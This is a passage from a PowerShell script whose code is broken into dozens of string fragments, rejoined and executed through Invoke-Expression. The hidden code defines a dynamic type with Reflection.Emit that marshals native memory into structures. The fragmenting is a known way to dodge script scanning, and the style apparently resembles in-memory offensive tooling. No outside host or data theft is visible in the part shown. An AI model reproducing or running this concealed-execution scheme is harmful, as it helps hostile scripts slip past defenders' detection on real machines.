   ',' $ILGenerator','2.Emit([Refle','ction.Emit.Op','Codes]::Ldarg','_0)
    $ILGe','nerator2.Emit','([Reflection.','Emit.OpCodes]','::Ldtoken, $S','tructBuilder)','
    $ILGener','ator2.Emit([R','eflection.Emi','t.OpCodes]::C','all,
        ','[Type].GetMet','hod(''GetTypeF','romHandle''))
','    $ILGenera','tor2.Emit([Re','flection.Emit','.OpCodes]::Ca','ll,
        [','Runtime.Inter','opServices.Ma','rshal].GetMet','hod(''PtrToStr','ucture'', [Typ','e[]] @([IntPt','r], [Type])))','
    $ILGener','ator2.Emit([R','eflection.Emi','t.OpCodes]::U','nbox_Any, $St','ructBuilder)
','    $ILGenera','tor2.Emit([Re','flection.Emit','.OpCodes]::Re','t)

    $Stru','ctBuilder.Cre','ateType()
}
'); $script = $fragments -join ''; Invoke-Expression $script